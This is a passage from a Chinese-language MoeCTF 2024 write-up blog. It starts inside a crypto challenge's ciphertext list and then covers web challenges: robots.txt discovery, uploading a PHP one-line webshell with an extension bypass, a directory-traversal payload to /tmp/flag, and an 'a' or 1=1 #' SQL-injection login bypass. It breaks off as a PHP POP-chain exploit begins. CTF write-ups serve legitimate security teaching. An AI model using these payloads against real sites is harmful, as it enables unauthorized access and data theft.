style=color:#ae81ff>248497269558037476989199286642120676823</span>, <span style=color:#ae81ff>27426372552503547932146407600438894266</span>, <span style=color:#ae81ff>99885839446999373024614710052031031159</span>, <span style=color:#ae81ff>238693364649026611386487480573211208980</span>, <span style=color:#ae81ff>27047849084544903200283111147329657123</span>, <span style=color:#ae81ff>261687609401872239323715016608713989139</span>, <span style=color:#ae81ff>34926503987070847956303036393611830590</span>, <span style=color:#ae81ff>252495954285655595492775877967398282722</span>, <span style=color:#ae81ff>249358827602419141539353237669905281246</span>, <span style=color:#ae81ff>42551212101869966935955269842854722856</span>, <span style=color:#ae81ff>286527336123436427709115043975536071462</span>, <span style=color:#ae81ff>158097411156207320921055042509886995091</span>, <span style=color:#ae81ff>40982984899524424348979403377331335675</span>, <span style=color:#ae81ff>87268254405858939730919659372073314983</span>, <span style=color:#ae81ff>142920872841164853694746048293715385493</span>, <span style=color:#ae81ff>280344634952903421792629929689092857993</span>, <span style=color:#ae81ff>203584314487374069738101729666435007339</span>, <span style=color:#ae81ff>76747904284507590577908045394001414841</span>, <span style=color:#ae81ff>18608573158088521401404614102481693137</span>, <span style=color:#ae81ff>104158289118605398449367221892619783009</span>, <span style=color:#ae81ff>182616719368573751169836443225324741716</span>, <span style=color:#ae81ff>272025723760783252166092979911587562064</span>, <span style=color:#ae81ff>24194069309604403496494752448487752613</span>, <span style=color:#ae81ff>71973842397785917741048132725314885345</span>, <span style=color:#ae81ff>281558046604363121112749722271741416764</span>, <span style=color:#ae81ff>66965324704079734796576428718112513855</span>, <span style=color:#ae81ff>105222756356650324548621319241035836840</span>, <span style=color:#ae81ff>331654051401420900830576011369146182</span>, <span style=color:#ae81ff>131087815164777263900650262777429797113</span>, <span style=color:#ae81ff>76104729920151139813274463849368737612</span>, <span style=color:#ae81ff>163253554841934325278065946152769269296</span>, <span style=color:#ae81ff>35973933431510942249046321254376084104</span>, <span style=color:#ae81ff>223355354158871484030430212060934655984</span>, <span style=color:#ae81ff>181704973473887713398031933516341967465</span>, <span style=color:#ae81ff>131391458395622565487686089688656869743</span>, <span style=color:#ae81ff>153029062510158353978320224242258979076</span>, <span style=color:#ae81ff>75598349867958834632866616947240059419</span>, <span style=color:#ae81ff>107656133091853571710502064573530657194</span>, <span style=color:#ae81ff>261653899003034450454605322537555204702</span>, <span style=color:#ae81ff>102387069931966536076616272953425585051</span>, <span style=color:#ae81ff>174654548539988861301269811985320013260</span>, <span style=color:#ae81ff>30731762585661721683653192240732246059</span>, <span style=color:#ae81ff>265493340795853624586170054917042208660</span>, <span style=color:#ae81ff>174818040730242275465453007894471517233</span>, <span style=color:#ae81ff>99514915046145707535310601810631334278</span>, <span style=color:#ae81ff>133978892607644700903700803642408771370</span>, <span style=color:#ae81ff>216019770199630171637325931783378096100</span>, <span style=color:#ae81ff>76687884966028369399497157007109898467</span>, <span style=color:#ae81ff>262185741950606001987209986574269562289</span>, <span style=color:#ae81ff>101935410844521914696784339882721918198</span>, <span style=color:#ae81ff>85956270718878931834010975962772401589</span>, <span style=color:#ae81ff>117578315837774870077915813512746446219</span>, <span style=color:#ae81ff>209811226703488479967593762805568394383</span>, <span style=color:#ae81ff>85782228978690599612110880989543246041</span>, <span style=color:#ae81ff>234993402267259336147096170367513324439</span>, <span style=color:#ae81ff>158487299348452041021565296682698871789</span>, <span style=color:#ae81ff>159701431055714867184644360639841355076</span>, <span style=color:#ae81ff>109022557288733938098734847159477770521</span>, <span style=color:#ae81ff>20764822884655633017647117775843651332</span>, <span style=color:#ae81ff>144987524936939260617020678038224835887</span>, <span style=color:#ae81ff>214906746504968333094519539609226540495</span>, <span style=color:#ae81ff>61852186870193663367998110214331582115</span>, <span style=color:#ae81ff>90175894032076080713807606548780168998</span>, <span style=color:#ae81ff>283504071501037047650569090140982777586</span>, <span style=color:#ae81ff>267695305479884628857258564337611106120</span>, <span style=color:#ae81ff>2466175482923380874813569827625743835</span>, <span style=color:#ae81ff>62561740902965346823256447383892272796</span>, <span style=color:#ae81ff>181458673990444296212252831090106274182</span>, <span style=color:#ae81ff>151903421483215372136947284355251617709</span>, <span style=color:#ae81ff>19545903652854510304023406921387221130</span>, <span style=color:#ae81ff>219205004027218279279153442572018305650</span>, <span style=color:#ae81ff>62495663621315535552427938857863551873</span>, <span style=color:#ae81ff>12365469869484359722316573851483855865</span>, <span style=color:#ae81ff>84444120685499458796249283893323932282</span>, <span style=color:#ae81ff>240719245204462516267560756675192129462</span>, <span style=color:#ae81ff>27868242791206675092288978266113368469</span>, <span style=color:#ae81ff>231956104988320170956546781095814860314</span>, <span style=color:#ae81ff>238410591787987745803829175586952288627</span>, <span style=color:#ae81ff>290649141309468101840354611586699479851</span>, <span style=color:#ae81ff>288298044918505512172272603794059992911</span>, <span style=color:#ae81ff>43375655853069820305921366762777897508</span>, <span style=color:#ae81ff>195308577786654489057887409352840304641</span>, <span style=color:#ae81ff>184459971400898842809886506207633536394</span>, <span style=color:#ae81ff>255884612697066296714973816950917234211</span>, <span style=color:#ae81ff>8695922085804648269560669225439485137</span>, <span style=color:#ae81ff>109407350389195091443836128149623969417</span>, <span style=color:#ae81ff>40151058765649465408124869078260007620</span>, <span style=color:#ae81ff>125484946058191366826510549493690011718</span>, <span style=color:#ae81ff>71132588066103752922321942940739808864</span>, <span style=color:#ae81ff>74434669478187680319595294456652807097</span>, <span style=color:#ae81ff>187368213679294937718535073296853726111</span>, <span style=color:#ae81ff>63461505676143678393259420949793811831</span>, <span style=color:#ae81ff>131619805472714703711458729455838994067</span>, <span style=color:#ae81ff>8579657158619864010437706463902003097</span>, <span style=color:#ae81ff>60626278761876782233388469543817973673</span>, <span style=color:#ae81ff>44776499706241603722632560896220653186</span>, <span style=color:#ae81ff>257249861781237389988455384617803171877</span>, <span style=color:#ae81ff>161899873165011719282095749671993720527</span>, <span style=color:#ae81ff>73303482092538159761390536102771615311</span>, <span style=color:#ae81ff>141674253732456103774983358188317473860</span>, <span style=color:#ae81ff>112299149158347774069079224861237069975</span>, <span style=color:#ae81ff>192409969047313867540459549167233638120</span>, <span style=color:#ae81ff>52560717143548208264188844553309600513</span>, <span style=color:#ae81ff>209294007943747095607573416682772182613</span>, <span style=color:#ae81ff>65285862009539442533024037477398617382</span>, <span style=color:#ae81ff>141465096635701758351979378177631042196</span>, <span style=color:#ae81ff>282970656853503001128091562858564344839</span>, <span style=color:#ae81ff>50475483578642585644452991078499278745</span>, <span style=color:#ae81ff>162546597698227455939743094437394415689</span>, <span style=color:#ae81ff>65258447920153625609456176138520078583</span>, <span style=color:#ae81ff>25184730952052088803921023041299838584</span>, <span style=color:#ae81ff>228883100940853988548836641050823478387</span>, <span style=color:#ae81ff>234342509561041384559923481191578502671</span>, <span style=color:#ae81ff>96929129863331626375704681481278825323</span>, <span style=color:#ae81ff>288533470498072097357398960101692503873</span>, <span style=color:#ae81ff>202238020435442160571930572760188491021</span>, <span style=color:#ae81ff>179010548891454398845389500871076122861</span>, <span style=color:#ae81ff>210509821764943794358893224681677583929</span>, <span style=color:#ae81ff>301357944197101288505771002301759006254</span>, <span style=color:#ae81ff>188933290023352627523422420332593360537</span>, <span style=color:#ae81ff>207946655777875200521742190622482472884</span>, <span style=color:#ae81ff>288626263488145443150622420747070805416</span>, <span style=color:#ae81ff>75616301779108425588545170038742534166</span>, <span style=color:#ae81ff>58163857263381687168244101022135667109</span>, <span style=color:#ae81ff>297006021514663344215599115965804102114</span>, <span style=color:#ae81ff>297690420826548736122127126645053452341</span>, <span style=color:#ae81ff>88307045391242971429880119414942510712</span>, <span style=color:#ae81ff>186427606153958359494215188169120285788</span>, <span style=color:#ae81ff>135488686276533521058776859854524444361</span>, <span style=color:#ae81ff>185380054960856211260651416683468161990</span>, <span style=color:#ae81ff>175033658667416561573078028845860911744</span>, <span style=color:#ae81ff>223026004671602541191897755812121342354</span>, <span style=color:#ae81ff>34657268786986063209312902409995458857</span>, <span style=color:#ae81ff>120560332690000675303295481174067849230</span>, <span style=color:#ae81ff>55304621833927249516093996383526467671</span>, <span style=color:#ae81ff>111480233798478730015825495041130765708</span>, <span style=color:#ae81ff>188996716801525995463705449722399676888</span>, <span style=color:#ae81ff>276300230605454487705048192796463035731</span>, <span style=color:#ae81ff>195951365841304132244984630163178946841</span>, <span style=color:#ae81ff>97383655947416522972353051984313703380</span>, <span style=color:#ae81ff>94486945760999630041197414137963583839</span>, <span style=color:#ae81ff>180706938513681126017333618518691884990</span>, <span style=color:#ae81ff>291355503207799224380050183085704824037</span>, <span style=color:#ae81ff>69034413486375685936282884707402207337</span>, <span style=color:#ae81ff>147750870458026934714106830614187010708</span>, <span style=color:#ae81ff>45030500748522416863096615057804736553</span>, <span style=color:#ae81ff>242760053973560804002707125041520857401</span>, <span style=color:#ae81ff>78549841097746795170488790352479728712</span>, <span style=color:#ae81ff>2356186555504071026416878904180857750</span>, <span style=color:#ae81ff>250486437623828232647064146324392061051</span>, <span style=color:#ae81ff>23443836455198610186212360005846025976</span>, <span style=color:#ae81ff>174557226633145985326629017377610499133</span>, <span style=color:#ae81ff>105578481831185315088267357915446186040</span>, <span style=color:#ae81ff>275620780071666328887795273613981325091</span>, <span style=color:#ae81ff>23435505408737317601794562472269448966</span>, <span style=color:#ae81ff>153209223406380813663608757935808571040</span>, <span style=color:#ae81ff>298537417505667302508269715871007454162</span>, <span style=color:#ae81ff>203833907122687718347615710181705388877</span>, <span style=color:#ae81ff>41923370405573382737900061813058979798</span>, <span style=color:#ae81ff>3762696947926387653032627637114050038</span>, <span style=color:#ae81ff>201362054098012734707571348865729525585</span>, <span style=color:#ae81ff>285561801443127226417656620776228615886</span>, <span style=color:#ae81ff>111526376057659222252771678197929357387</span>, <span style=color:#ae81ff>203857473647840873587593099562928738804</span>, <span style=color:#ae81ff>44500972779851392967974092230683443589</span>, <span style=color:#ae81ff>131565609415497588649207556985146740667</span>, <span style=color:#ae81ff>118140388348838985266223643241117982200</span>, <span style=color:#ae81ff>151449885527204880099343472664885565851</span>, <span style=color:#ae81ff>296392921256617994387220911796693904909</span>, <span style=color:#ae81ff>171323803851876663161606688343678019752</span>, <span style=color:#ae81ff>77152982746512263077542395226111426871</span>, <span style=color:#ae81ff>71648764903315646849225859605038798241</span>, <span style=color:#ae81ff>204032734481806785543119754456569617316</span>, <span style=color:#ae81ff>6308687907566364067313782129902290691</span>, <span style=color:#ae81ff>16601010504475415688487155708691097587</span>, <span style=color:#ae81ff>267844409827567109183739120606590016153</span>, <span style=color:#ae81ff>8224746302136608660764206696943998066</span>, <span style=color:#ae81ff>66759882079234093195284745682061177129</span>, <span style=color:#ae81ff>246382951504754280882643835151081337286</span>, <span style=color:#ae81ff>255668159720160142170457715248631352728</span>, <span style=color:#ae81ff>198682585307670767869381177003851088434</span>, <span style=color:#ae81ff>52435298055396076040371814840062860322</span>, <span style=color:#ae81ff>71487031168170283085378067681578926209</span>, <span style=color:#ae81ff>19270201008106231446848331516948751837</span>, <span style=color:#ae81ff>259975200953378762173082382130139147342</span>, <span style=color:#ae81ff>100957428421542421187997144087873975651</span>, <span style=color:#ae81ff>208596806512779765020431672051552927799</span>, <span style=color:#ae81ff>299145970783704112359526450087000033589</span>, <span style=color:#ae81ff>150947534399996219237186223933189906692</span>, <span style=color:#ae81ff>2048564430495506099844799218948689248</span>, <span style=color:#ae81ff>18962488382754079143174369765373573160</span>, <span style=color:#ae81ff>123031997265327646442638576943887737076</span>, <span style=color:#ae81ff>244982544573374061178705105734141424990</span>, <span style=color:#ae81ff>146410849043938910996544914770892579969</span>, <span style=color:#ae81ff>223289253099676841267315311685506771609</span>, <span style=color:#ae81ff>51374350072145272462874563304717832675</span>, <span style=color:#ae81ff>11071799523780604861063183113721965515</span>, <span style=color:#ae81ff>64879815349665030137608387728274669513</span>, <span style=color:#ae81ff>80407660651138778640313857555610913997</span>, <span style=color:#ae81ff>303240361297474032656368918727922343524</span>, <span style=color:#ae81ff>103535171867293830164396688627880762056</span>, <span style=color:#ae81ff>80560992291681297484967629700766125368</span>, <span style=color:#ae81ff>143230791823232014720768325847406122476</span>, <span style=color:#ae81ff>188716605362804777650654549500430035344</span>, <span style=color:#ae81ff>232870220205325961834389425482865329315</span>, <span style=color:#ae81ff>283584919111555062850512413920721407255</span>, <span style=color:#ae81ff>206566027046056486360456937040463884619</span>, <span style=color:#ae81ff>157265544558229360994066706355140059167</span>, <span style=color:#ae81ff>234540100059557817987307855523008271441</span>, <span style=color:#ae81ff>145080729935010940836509908225154438654</span>, <span style=color:#ae81ff>87632901547252991486640361323948527297</span>, <span style=color:#ae81ff>132851295075144433057295220850764336697</span>, <span style=color:#ae81ff>119332580967710872282556206817561230364</span>, <span style=color:#ae81ff>252662535367310697404410284791596079390</span>, <span style=color:#ae81ff>116953597995893914045234747272641030589</span>, <span style=color:#ae81ff>100249498080127826743176896590140549012</span>, <span style=color:#ae81ff>136127222991007877469608037092253387587</span>, <span style=color:#ae81ff>293872159333237281344632727438901916796</span>, <span style=color:#ae81ff>188380258232793584033919525452891729603</span>, <span style=color:#ae81ff>1610116068556601814921533488550773010</span>, <span style=color:#ae81ff>227538093179017809788576278302184723209</span>, <span style=color:#ae81ff>96083211912155805281570727244009758189</span>, <span style=color:#ae81ff>177565192075026414675108774674272650977</span>, <span style=color:#ae81ff>48610376097473152433617435307712235835</span>, <span style=color:#ae81ff>247706157308906487216795222963091222950</span>, <span style=color:#ae81ff>158089460554439410339817265377357657075</span>, <span style=color:#ae81ff>242596743543458727108836420358578527964</span>, <span style=color:#ae81ff>157838486547678450498998359338995593594</span>, <span style=color:#ae81ff>154936428786673098370270244313756793764</span>, <span style=color:#ae81ff>230069001282099253337070315838992422706</span>, <span style=color:#ae81ff>302203905412042965194022309363722872023</span>, <span style=color:#ae81ff>278925578180003228386990239779184911424</span>, <span style=color:#ae81ff>2121847168422140085785053284950978779</span>, <span style=color:#ae81ff>88186566913792352545205577594300112005</span>, <span style=color:#ae81ff>127051055548524716972172930848069016819</span>, <span style=color:#ae81ff>216775577660712694343189516378309335187</span>, <span style=color:#ae81ff>44934779747684486400910901018161470888</span>, <span style=color:#ae81ff>32429597712898788634301884219187226083</span>, <span style=color:#ae81ff>219683174528279300995710495669083670544</span>, <span style=color:#ae81ff>37001671152735870067433052249003677244</span>, <span style=color:#ae81ff>40408367335919429215031155701333780256</span>, <span style=color:#ae81ff>156957056705864208022145617831060134907</span>, <span style=color:#ae81ff>180077610045061934161783737112285900966</span>, <span style=color:#ae81ff>59357544819520045255625797086421901884</span>, <span style=color:#ae81ff>77751400794807935281264495346525107329</span>, <span style=color:#ae81ff>4517615764752715802675887411287287137</span>, <span style=color:#ae81ff>76319782726782483955139757169428276003</span>, <span style=color:#ae81ff>176009402215469456144386392247781430661</span>, <span style=color:#ae81ff>283055695252017869386094188584670242363</span>, <span style=color:#ae81ff>20001716567499724882317501875143788088</span>, <span style=color:#ae81ff>125228382132280749989067609697418628387</span>, <span style=color:#ae81ff>144053090751393640875176862167012247830</span>, <span style=color:#ae81ff>15289106046221987660093620422889539867</span>, <span style=color:#ae81ff>111243866573605033251079958638430165633</span>, <span style=color:#ae81ff>169264885994758018612038619809803723688</span>, <span style=color:#ae81ff>11895954311759483419234457833286931577</span>, <span style=color:#ae81ff>273147053963507607445612310063799123998</span>, <span style=color:#ae81ff>158981773284803069491507978382595811562</span>, <span style=color:#ae81ff>41293513794446810141896116395025053234</span>, <span style=color:#ae81ff>57441237860743029006005815967510568612</span>, <span style=color:#ae81ff>109171476551418034153338841133917497633</span>, <span style=color:#ae81ff>136539712287056106151501004438585146777</span>, <span style=color:#ae81ff>278918550892367788720071091355436733468</span>, <span style=color:#ae81ff>211360251223022250021398148918837686812</span>, <span style=color:#ae81ff>254351242496347083009146404917085951637</span>, <span style=color:#ae81ff>130260153203964833202474997491055897705</span>, <span style=color:#ae81ff>221930288825889900517852991745469270910</span>, <span style=color:#ae81ff>66354211799382156899053592476719001842</span>, <span style=color:#ae81ff>127898620670768976254134750731374490934</span>, <span style=color:#ae81ff>298131830425274848646460016809595859328</span>, <span style=color:#ae81ff>132109510144911727511061804395381822418</span>, <span style=color:#ae81ff>210917766469026421985352121201196497206</span>, <span style=color:#ae81ff>5441137715689271309917542693016936841</span>, <span style=color:#ae81ff>209516950406881264617228336887254107528</span>, <span style=color:#ae81ff>92275151703152148383106907311559718841</span>, <span style=color:#ae81ff>46255650973652148247469464088017660080</span>, <span style=color:#ae81ff>182628529221607295465655096378164148336</span>, <span style=color:#ae81ff>52574278547120304143820897608762444985</span>, <span style=color:#ae81ff>63698472804719856407197390836793525437</span>, <span style=color:#ae81ff>30457182690865024857724004613999433676</span>, <span style=color:#ae81ff>212073418196280214618461610817423630022</span>, <span style=color:#ae81ff>48875930775858981513092672396243080640</span>, <span style=color:#ae81ff>113234797533868946026347891158142991388</span>, <span style=color:#ae81ff>256534108458875318962058222544020064164</span>, <span style=color:#ae81ff>22522715662428558833985333846937440705</span>, <span style=color:#ae81ff>97553118958308509177643330175409499003</span>, <span style=color:#ae81ff>197088081433425221073434635573357125592</span>, <span style=color:#ae81ff>157303116668734020456228309942188293059</span>, <span style=color:#ae81ff>110316346669278795114546305726864504681</span>, <span style=color:#ae81ff>228887397917708007004920589862367347873</span>, <span style=color:#ae81ff>112210930213921962308944716344585917343</span>, <span style=color:#ae81ff>95017760786235266842788931502689331157</span>, <span style=color:#ae81ff>303479014347753799316861720146531596843</span>, <span style=color:#ae81ff>138677197920058856282155251074088437081</span>, <span style=color:#ae81ff>285912176726299387362893467150449209426</span>, <span style=color:#ae81ff>120309832759140713296686339140142433386</span>, <span style=color:#ae81ff>279125897926861811239250830750932241600</span>, <span style=color:#ae81ff>289502053647872994218190050825294169535</span>, <span style=color:#ae81ff>262459212837236162171047720358005836712</span>, <span style=color:#ae81ff>290390838897912466575239533978002826151</span>, <span style=color:#ae81ff>292988850197951752250595007039860868400</span>, <span style=color:#ae81ff>34796135808311610468205608686622819504</span>, <span style=color:#ae81ff>25206338413385638687826160218013868658</span>, <span style=color:#ae81ff>42180804482932648992176529097078580055</span>, <span style=color:#ae81ff>195897225052351816559125785179252565465</span>, <span style=color:#ae81ff>290060760535408066224831756224248708027</span>, <span style=color:#ae81ff>34243626514368402883316460494646065629</span>, <span style=color:#ae81ff>159497726968729366867935528734367549832</span>, <span style=color:#ae81ff>267785772871046662107247674801793846921</span>, <span style=color:#ae81ff>47342328853090920958565777290912999560</span>, <span style=color:#ae81ff>194980176549393239742230551297786993434</span>, <span style=color:#ae81ff>88020247887557921707284362381274951852</span>, <span style=color:#ae81ff>255474100333005567974457204812640809071</span>, <span style=color:#ae81ff>93324791124684170744053910877870176609</span>, <span style=color:#ae81ff>69542826141091170218040988642070014011</span>, <span style=color:#ae81ff>188678529221313094426441439309063681864</span>, <span style=color:#ae81ff>56030802691247887446204447769438570825</span>, <span style=color:#ae81ff>74312207153349149422500961216106557393</span>, <span style=color:#ae81ff>153811406554673020809393530896156460494</span>, <span style=color:#ae81ff>130232956128662318657579623819323546361</span>, <span style=color:#ae81ff>241587755919930468705435097001858194189</span>, <span style=color:#ae81ff>150548598672513907492388638742866339038</span>, <span style=color:#ae81ff>38780469811591978249139697733603217652</span>, <span style=color:#ae81ff>237554030153815380781978075720171312418</span>, <span style=color:#ae81ff>96541634878634946114738393982914693394</span>, <span style=color:#ae81ff>83284071476491638125716901346418260661</span>, <span style=color:#ae81ff>277535192833115492238855935055373371297</span>, <span style=color:#ae81ff>92291115416977028401374199691398676627</span>, <span style=color:#ae81ff>105634075531674200869064066234662065605</span>, <span style=color:#ae81ff>59669321288506854711632528171527160495</span>, <span style=color:#ae81ff>24913178886798791108798737682436779604</span>, <span style=color:#ae81ff>191902245938756063865405758957515936934</span>, <span style=color:#ae81ff>200833770402179506644143905670947994664</span>, <span style=color:#ae81ff>249327029439265065126080906281744759655</span>, <span style=color:#ae81ff>2368715218056973901783211260781833927</span>, <span style=color:#ae81ff>133209645820509536502329231321782644514</span>, <span style=color:#ae81ff>170083361139958757944996287868734988169</span>, <span style=color:#ae81ff>143242266754832252556264383809361085258</span>, <span style=color:#ae81ff>198438133508477313319510861550461456953</span>, <span style=color:#ae81ff>226416574016152349355240811564666677855</span>, <span style=color:#ae81ff>131995850810926550122710727062184985075</span>, <span style=color:#ae81ff>206211971624338783828953817981719254101</span>, <span style=color:#ae81ff>95022339713176475801874420969255633409</span>, <span style=color:#ae81ff>39239785273544046574575511790952158726</span>, <span style=color:#ae81ff>6761950061835300419279903725369635970</span>, <span style=color:#ae81ff>160849355761964483498641169767552240859</span>, <span style=color:#ae81ff>44129081383649229398785011378026849128</span>, <span style=color:#ae81ff>116611486899507912253396257166983831123</span>, <span style=color:#ae81ff>102748760887182142877957834312659347601</span>, <span style=color:#ae81ff>100973668783270797012352094429175531207</span>, <span style=color:#ae81ff>110548564207426762905750742091610942634</span>, <span style=color:#ae81ff>205424582078496700107783237952155124442</span>, <span style=color:#ae81ff>210932790939110827079725957948996247757</span>, <span style=color:#ae81ff>54413304958149902897514912130730392489</span>, <span style=color:#ae81ff>181315803651356180100745517014898850424</span>, <span style=color:#ae81ff>183346938138867395962624263310328788228</span>, <span style=color:#ae81ff>133507835720650939452036529283981720094</span>, <span style=color:#ae81ff>244220649646693249242542702657146329679</span>, <span style=color:#ae81ff>111814540087048948955999016117121133729</span>, <span style=color:#ae81ff>210757262617434713384638061648414714521</span>, <span style=color:#ae81ff>31712005436857719771604404352654183712</span>, <span style=color:#ae81ff>299210790483067037892753875410776716305</span>, <span style=color:#ae81ff>34216439939230284515095120240039231491</span>, <span style=color:#ae81ff>246820219620854547856488049434101568744</span>, <span style=color:#ae81ff>298588211282375015522910461809769779222</span>, <span style=color:#ae81ff>53320103067319149790078933423751044737</span>, <span style=color:#ae81ff>164977173816081040725650999609390274279</span>, <span style=color:#ae81ff>234782977255751828939911143180631329578</span>, <span style=color:#ae81ff>61521250269407451751766565186333346163</span>, <span style=color:#ae81ff>119529895182262920689181379893081203421</span>, <span style=color:#ae81ff>154588465395872896210615516764102943961</span>, <span style=color:#ae81ff>153034255402211966905777978896125271527</span>, <span style=color:#ae81ff>65497510688725487475002809757533544579</span>, <span style=color:#ae81ff>76824114145168270682129892469858568031</span>, <span style=color:#ae81ff>218064880554787781811938382300930885801</span>, <span style=color:#ae81ff>196850060586188141836799779247809406205</span>, <span style=color:#ae81ff>176023892018381269394229104598502170110</span>, <span style=color:#ae81ff>32491776807255207889633110137157036238</span>, <span style=color:#ae81ff>41150198830446315717651890670848632754</span>, <span style=color:#ae81ff>260753023840843193587871227195221789744</span>, <span style=color:#ae81ff>48345408122882987831052823644867513356</span>, <span style=color:#ae81ff>80045935233531979816083287928071697883</span>, <span style=color:#ae81ff>131878104259519592871955471048058374000</span>, <span style=color:#ae81ff>15534379538690707223440448056318568055</span>, <span style=color:#ae81ff>131291412522855581131329717355299310716</span>, <span style=color:#ae81ff>37018675243998552749630837151597269431</span>, <span style=color:#ae81ff>144343493968520204610097930388908478903</span>, <span style=color:#ae81ff>67236444178494959708570043908346657722</span>, <span style=color:#ae81ff>102574100831305499879105427279131095784</span>, <span style=color:#ae81ff>249069309513964056714882166119752611668</span>, <span style=color:#ae81ff>210718130986716991560768592011623825976</span>, <span style=color:#ae81ff>266242407402824082344585571101593909650</span>, <span style=color:#ae81ff>205203132247422842477137158586071965100</span>, <span style=color:#ae81ff>301157372202750742637385626243753030679</span>, <span style=color:#ae81ff>40886620741595313792996852647181029560</span>, <span style=color:#ae81ff>253361171396328884567373946949359324229</span>, <span style=color:#ae81ff>50071128101197582041162516700015376269</span>, <span style=color:#ae81ff>106002417001877546867386840932652850816</span>, <span style=color:#ae81ff>224086864980106045542532841236299648038</span>, <span style=color:#ae81ff>42103921294151508500634063253613482845</span>, <span style=color:#ae81ff>49777138159264482913170680298952908154</span>, <span style=color:#ae81ff>24324534484842395819609478778764950811</span>, <span style=color:#ae81ff>204106593629836179932302789646808274058</span>, <span style=color:#ae81ff>266707066043760482642609614924857456238</span>, <span style=color:#ae81ff>18723835069315957900598472598907945204</span>, <span style=color:#ae81ff>244338819469013923747256697307964210342</span>, <span style=color:#ae81ff>36296287172854997655950896217230267111</span>, <span style=color:#ae81ff>292888671179451539882069138267865661448</span>, <span style=color:#ae81ff>287111415651274690627399445990831389362</span>, <span style=color:#ae81ff>79940439572496625318602146625920961720</span>, <span style=color:#ae81ff>288270505176661814341807462681727466925</span>, <span style=color:#ae81ff>153921178962139214138689743179633342125</span>, <span style=color:#ae81ff>263564317934507756965522450042219801757</span>, <span style=color:#ae81ff>197993323684501153884855839599466707355</span>, <span style=color:#ae81ff>72143993205715719344183507132882267579</span>, <span style=color:#ae81ff>67511075584002491895239101559049103979</span>, <span style=color:#ae81ff>231396344630318648781207380069016790960</span>, <span style=color:#ae81ff>268490084177254392405211695854127631350</span>, <span style=color:#ae81ff>45968181401712207064942095991325993181</span>, <span style=color:#ae81ff>34472329776995578971329318400545600788</span>, <span style=color:#ae81ff>112967316661320871429337739209994987784</span>, <span style=color:#ae81ff>209508577387521479468956337084132598710</span>, <span style=color:#ae81ff>194445696189141465862938111222574992064</span>, <span style=color:#ae81ff>229942079198360020568341753187100646148</span>, <span style=color:#ae81ff>47944382795398541172186729027517882654</span>, <span style=color:#ae81ff>54806201653083974379270761512143387910</span>, <span style=color:#ae81ff>93457347627015900562505045196097224001</span>, <span style=color:#ae81ff>152033139738914238723733340538181549419</span>, <span style=color:#ae81ff>123719026823969669345162603978875451754</span>, <span style=color:#ae81ff>154704533151410142607151617227929824563</span>, <span style=color:#ae81ff>32428281285686815618553795197210513625</span>, <span style=color:#ae81ff>265229864831280807254743597731258298440</span>, <span style=color:#ae81ff>14904705423314872103792141735779112532</span>, <span style=color:#ae81ff>177442398230615511669857060547212895616</span>, <span style=color:#ae81ff>144918716871520627851549439448066637518</span>, <span style=color:#ae81ff>203019416536984157536348865479415073573</span>, <span style=color:#ae81ff>288452420706913930307744155709559750006</span>, <span style=color:#ae81ff>282516471994395201735206793889605510595</span>, <span style=color:#ae81ff>150722332251745138694381051866105655391</span>, <span style=color:#ae81ff>234504581837296595003379465512031425988</span>, <span style=color:#ae81ff>44178766618576668748878202507789103195</span>, <span style=color:#ae81ff>217129489675072754441642067295058817201</span>, <span style=color:#ae81ff>245087939287551829934600756568137757979</span>, <span style=color:#ae81ff>240954534396950014938672406581264782638</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>decrypted_flag <span style=color:#f92672>=</span> decrypt_flag(ciphertext, p, a)
</span></span><span style=display:flex><span>print(decrypted_flag)
</span></span></code></pre></div><h1 id=web渗透测试与审计>Web渗透测试与审计</h1><h2 id=web渗透测试与审计入门指北>Web渗透测试与审计入门指北</h2><p>利用phpstudy进行搭建，得到flag</p><p><img alt=web入门 loading=lazy src=/posts/ctf/moectf2024/web%E5%85%A5%E9%97%A8.png></p><h2 id=弗拉格之地的入口>弗拉格之地的入口</h2><p>进入题目，hint是爬虫，联想到robots.txt，打开得到<code>/webtutorEntry.php</code>,进入页面得到flag</p><p><strong>moectf{CONGr@Tu14TioN-foR-KNOwlNG-ROBOtS_txT10e7d}</strong></p><h2 id=ez_http>ez_http</h2><img src=/ez_http1.png alt=ez_http1 style=zoom:50%><p><img alt=ez_http2 loading=lazy src=/posts/ctf/moectf2024/ez_http2.png></p><p><img alt=ez_http3 loading=lazy src=/posts/ctf/moectf2024/ez_http3.png></p><p><img alt=ez_http4 loading=lazy src=/posts/ctf/moectf2024/ez_http4.png></p><p><strong>moectf{y0u-4RE_ReA1lY-re@LlY_verY_c1EVEr!!!20ed}</strong></p><h2 id=垫刀之路01-moectf启动>垫刀之路01: MoeCTF？启动！</h2><p>正常流程</p><pre tabindex=0><code>ls / -&gt;cat /flag #提示在环境里 -&gt;输入env
</code></pre><h2 id=垫刀之路02-普通的文件上传>垫刀之路02: 普通的文件上传</h2><p>提示和01一样应该也在env里</p><p>传个一句话木马，然后打开env即可</p><h2 id=垫刀之路03-这是一个图床>垫刀之路03: 这是一个图床</h2><p>加了图片限制，写一个一句话，末尾改成jpg，抓包再把jpg改成php，执行system(&rsquo;env&rsquo;);就行了</p><h2 id=垫刀之路04-一个文件浏览器>垫刀之路04: 一个文件浏览器</h2><p>考察的知识点是目录遍历。简单的翻了一下不在目前的目录下通过<code>../</code>往上查找,(需要url编码),找到flag那一层，进去提示不在该文件下</p><p>根据moejail_lv1的提示猜测在tmp的目录下,里面有flag，得到答案。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>?path=../../../..//tmp/flag
</span></span></code></pre></div><h2 id=垫刀之路05-登陆网站>垫刀之路05: 登陆网站</h2><p>先想到是尝试爆破的，突然下面跳出以前sql注入的记录</p><p>试了一下就出来了，进行了简答的截取绕过</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>a&#39; or 1=1 #
</span></span></code></pre></div><h2 id=垫刀之路06-pop-base-mini-moe>垫刀之路06: pop base mini moe</h2><p>直接上wp</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>A</span> {
